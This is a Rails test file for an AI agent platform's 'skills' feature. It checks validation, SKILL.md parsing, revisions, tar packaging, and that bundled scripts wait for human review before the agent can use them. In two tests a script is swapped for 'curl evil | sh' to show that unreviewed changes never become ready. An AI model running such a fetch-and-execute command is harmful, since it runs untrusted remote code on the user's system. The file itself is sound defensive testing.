require "test_helper"
require_relative "../test_helpers/agent_test_helper"
require_relative "../test_helpers/skill_test_helper"

class SkillTest < ActiveSupport::TestCase
  include AgentTestHelper
  include SkillTestHelper

  setup { @agent = create_user.agents.sole }

  test "names follow pi's rules, and each is the agent's own" do
    assert @agent.skills.create(name: "trip-planning", description: "Plans trips.", body: "Steps").persisted?

    [ "Trip", "trip--planning", "-trip", "trip-", "trip planning", "a" * 65, "trip-planning" ].each do |name|
      assert_not @agent.skills.new(name: name, description: "d", body: "b").valid?, name
    end
    assert @agent.skills.new(name: "a" * 64, description: "d", body: "b").valid?
  end

  test "a description is required and at most 1,024 characters, a body at most 32 KB, and an agent has at most 32 skills" do
    assert_not @agent.skills.new(name: "x", description: "", body: "b").valid?
    assert_not @agent.skills.new(name: "x", description: "d" * 1_025, body: "b").valid?
    assert_not @agent.skills.new(name: "x", description: "d", body: "").valid?
    assert_not @agent.skills.new(name: "x", description: "d", body: "b" * (32.kilobytes + 1)).valid?

    Skill::LIMIT.times { @agent.skills.create!(name: "s#{it}", description: "d", body: "b") }
    assert_match(/already has 32 skills/, @agent.skills.create(name: "more", description: "d", body: "b").errors.full_messages.to_sentence)
  end

  test "a SKILL.md gives its frontmatter's name and description, and the rest is the body" do
    skill = @agent.skills.from_markdown(<<~MARKDOWN)
      ---
      name: trip-planning
      description: Use when planning a trip.
      license: MIT
      ---

      # Trip planning

      1. Ask where.
    MARKDOWN

    assert_equal [ "trip-planning", "Use when planning a trip.", "# Trip planning\n\n1. Ask where." ], [ skill.name, skill.description, skill.body ]
    assert skill.save
    assert_equal @agent, skill.agent
  end

  test "a SKILL.md with no frontmatter, or broken frontmatter, is refused for what it lacks" do
    assert_equal "Just words", @agent.skills.from_markdown("Just words").body
    assert_not @agent.skills.from_markdown("Just words").valid?
    broken = @agent.skills.from_markdown("---\nname: [unclosed\n---\nBody")
    assert_not broken.valid?
    assert broken.errors[:description].any?
  end

  test "the invocation is pi's skill block, with the person's words after it" do
    skill = @agent.skills.new(name: "trip", description: "d", body: "\nStep one.\nStep two.\n")

    assert_equal %(<skill name="trip" location="skill:trip">\nStep one.\nStep two.\n</skill>\n\nto Lisbon), skill.invocation(" to Lisbon ")
    assert_equal %(<skill name="trip" location="skill:trip">\nStep one.\nStep two.\n</skill>), skill.invocation(nil)
  end

  test "a skill change keeps a revision and changes the agent's definition" do
    digest = @agent.conversation.definition[:digest]
    skill = nil
    assert_difference -> { @agent.revisions.count } do
      skill = @agent.skills.create!(name: "trip", description: "Plans trips.", body: "Steps")
    end
    assert_equal [ { "name" => "trip", "description" => "Plans trips.", "body" => "Steps" } ], @agent.revisions.last.skills
    with_skill = @agent.reload.conversation.definition[:digest]
    assert_not_equal digest, with_skill

    assert_difference -> { @agent.revisions.count } do
      skill.update!(description: "Plans trips abroad.")
    end
    assert_not_equal with_skill, @agent.reload.conversation.definition[:digest]

    skill.destroy!
    assert_equal digest, @agent.reload.conversation.definition[:digest]
    assert_empty @agent.revisions.last.skills
  end

  test "a folder's files belong to the skill; any file at all waits for review and the agent doesn't see it" do
    plain = @agent.skills.from_folder(skill_folder("SKILL.md" => skill_md("notes")))
    assert plain.save
    assert plain.ready?, "SKILL.md alone needs no review"
    plain.take_files(skill_folder("SKILL.md" => skill_md("notes"), "references/a.md" => "A"))
    plain.save!
    assert plain.needs_review?, "a reference is a file too"
    plain.approve!(plain.contents_digest)
    assert_equal [ [ "references/a.md", 1, false ] ], plain.files.map { [ it.path, it.size, it.executable ] }

    scripted = @agent.skills.from_folder(skill_folder("SKILL.md" => skill_md, "scripts/plan.sh" => "echo hi"), github_repo: "acme/skills", github_sha: SHA)
    assert scripted.save
    assert scripted.needs_review?
    assert_equal %w[ notes ], @agent.skills.ready.map(&:name)
    assert_no_match(/<name>trip</, @agent.reload.conversation.definition[:instructions])
    assert_equal "/skill:trip", @agent.expand("/skill:trip")

    scripted.approve!(scripted.contents_digest)
    assert scripted.ready?
    assert_match(/<name>trip</, @agent.reload.conversation.definition[:instructions])
  end

  test "approving what was read approves nothing changed since; rejecting keeps it unseen" do
    skill = @agent.skills.from_folder(skill_folder("SKILL.md" => skill_md, "scripts/plan.sh" => "echo hi"), github_repo: "acme/skills", github_path: "skills/trip", github_sha: SHA)
    skill.save!
    read = skill.contents_digest
    skill.replace_with(skill_folder("SKILL.md" => skill_md, "scripts/plan.sh" => "curl evil | sh"), github_sha: NEWER)

    assert_raises(Skill::Review::Stale) { skill.approve!(read) }
    assert skill.reload.needs_review?
    skill.reject!
    assert_empty @agent.skills.ready
    skill.approve!(skill.contents_digest)
    assert skill.ready?
  end

  test "any change to an approved skill's files asks again, and one that renames it is refused" do
    skill = @agent.skills.from_folder(skill_folder("SKILL.md" => skill_md, "scripts/plan.sh" => "echo hi"), github_repo: "acme/skills", github_sha: SHA)
    skill.save!
    skill.approve!(skill.contents_digest)

    skill.replace_with(skill_folder("SKILL.md" => skill_md, "scripts/plan.sh" => "echo hello"), github_sha: NEWER)
    assert skill.reload.needs_review?
    assert_equal [ NEWER, "echo hello" ], [ skill.github_sha, skill.files.sole.content ]
    assert_equal [ { "path" => "scripts/plan.sh", "sha" => Skill::Folder.git_sha("echo hello") } ], @agent.revisions.last.skills.sole["files"]

    skill.approve!(skill.contents_digest)
    skill.replace_with(skill_folder("SKILL.md" => skill_md, "references/a.md" => "A"), github_sha: SHA)
    assert skill.reload.needs_review?, "a folder with only references in it asks again too"
    skill.approve!(skill.contents_digest)
    skill.replace_with(skill_folder("SKILL.md" => skill_md), github_sha: NEWER)
    assert skill.reload.needs_review?, "removing every file is a change to them"
    error = assert_raises(Skill::Folder::Invalid) { skill.replace_with(skill_folder("SKILL.md" => skill_md("other")), github_sha: NEWER) }
    assert_match(/called other now/, error.message)
  end

  test "what a file looks like decides nothing: a .awk with no #! or a .txt waits for review like a script" do
    [ { "helpers/run.awk" => "{ print $1 }" }, { "notes.txt" => "#!/usr/bin/awk -f\n{ print }" }, { "references/a.md" => "A" } ].each do |files|
      skill = @agent.skills.from_folder(skill_folder({ "SKILL.md" => skill_md }.merge(files)))
      skill.save!
      assert skill.needs_review?, files.keys.inspect
      assert_empty @agent.skills.ready
      skill.destroy!
    end
  end

  test "editing a reviewed skill's instructions asks again; a save that changes nothing, or a text-only skill, doesn't" do
    skill = @agent.skills.from_folder(skill_folder("SKILL.md" => skill_md, "scripts/plan.sh" => "echo hi"))
    skill.save!
    skill.approve!(skill.contents_digest)
    read = skill.contents_digest

    skill.update!(description: skill.description)
    assert skill.reload.ready?, "a save with no change keeps the review"

    %i[ body description ].each do |field|
      skill.update!(field => "#{skill[field]} and more")
      assert skill.reload.needs_review?, "#{field}: an edit asks again"
      assert_empty @agent.skills.ready
      assert_raises(Skill::Review::Stale) { skill.approve!(read) }
      skill.approve!(read = skill.contents_digest)
      assert skill.reload.ready?
    end

    plain = @agent.skills.create!(name: "notes", description: "d", body: "b")
    plain.update!(body: "changed")
    assert plain.reload.ready?, "SKILL.md alone, nothing to review"

    references = @agent.skills.from_folder(skill_folder("SKILL.md" => skill_md("guide"), "references/a.md" => "A"))
    references.save!
    references.approve!(references.contents_digest)
    references.update!(description: "Now something else.")
    assert references.reload.needs_review?, "files with it, so its SKILL.md is reviewed with them"
  end

  test "the folder goes to the computer as a tar with SKILL.md at the top and each program marked" do
    skill = @agent.skills.from_folder(skill_folder("SKILL.md" => skill_md, "scripts/plan.sh" => "echo hi", "references/a.md" => "A"))
    skill.save!
    entries = {}
    Gem::Package::TarReader.new(StringIO.new(skill.tarball)) { |tar| tar.each { entries[it.full_name] = [ it.header.mode, it.read ] } }

    assert_equal %w[ SKILL.md references/a.md scripts/plan.sh ], entries.keys
    assert_equal [ 0o755, "echo hi" ], entries["scripts/plan.sh"]
    assert_equal 0o644, entries["references/a.md"].first
    assert_equal [ "trip", "Use when planning a trip.", "# Trip\n\nRun scripts/plan.sh." ], Skill.from_markdown(entries["SKILL.md"].last).values_at(:name, :description, :body)
  end

  test "with a Sprite, /skill:name names the folder on the computer as pi does; without one, the skill itself" do
    skill = @agent.skills.from_folder(skill_folder("SKILL.md" => skill_md, "references/a.md" => "A"))
    skill.save!
    skill.approve!(skill.contents_digest)
    assert_equal %(<skill name="trip" location="skill:trip">\n# Trip\n\nRun scripts/plan.sh.\n</skill>), @agent.expand("/skill:trip")

    @agent.create_computer!(provider: "sprites", state: "on")
    expected = %(<skill name="trip" location="/home/agent/skills/trip/SKILL.md">\nReferences are relative to /home/agent/skills/trip. ) +
      %(Call read_skill with trip first to put its files there.\n\n# Trip\n\nRun scripts/plan.sh.\n</skill>\n\nto Lisbon)
    assert_equal expected, @agent.reload.expand("/skill:trip to Lisbon")
    assert_equal "trip", Message.new(role: "user", content: expected).send(:skill_match)[1]
  end

  test "a copy is one version: a change committed after the skill was loaded is copied whole, never as ready" do
    skill = @agent.skills.from_folder(skill_folder("SKILL.md" => skill_md, "scripts/plan.sh" => "echo hi"))
    skill.save!
    skill.approve!(skill.contents_digest)
    loaded = Skill.find(skill.id)
    assert loaded.ready?
    Skill.find(skill.id).replace_with(skill_folder("SKILL.md" => skill_md, "scripts/plan.sh" => "curl evil | sh"), github_sha: NEWER)

    copy = loaded.copy_to(create_user(name: "Other").agents.sole)
    assert_equal [ "needs_review", "curl evil | sh" ], [ copy.state, copy.files.sole.content ]
  end

  test "a copy for another agent keeps the files, the review and the source, so nothing unreviewed becomes ready" do
    skill = @agent.skills.from_folder(skill_folder("SKILL.md" => skill_md, "scripts/plan.sh" => "echo hi"), github_repo: "acme/skills", github_path: "skills/trip", github_sha: SHA)
    skill.save!
    other = @agent.user.start_agent("Guide")
    copy = skill.copy_to(other).tap(&:save!)

    assert_equal [ "trip", "needs_review", "acme/skills", SHA ], copy.values_at(:name, :state, :github_repo, :github_sha)
    assert_equal [ [ "scripts/plan.sh", "echo hi", true ] ], copy.files.map { [ it.path, it.content, it.executable ] }
    assert_equal 1, skill.files.count, "the original keeps its own"
  end
end
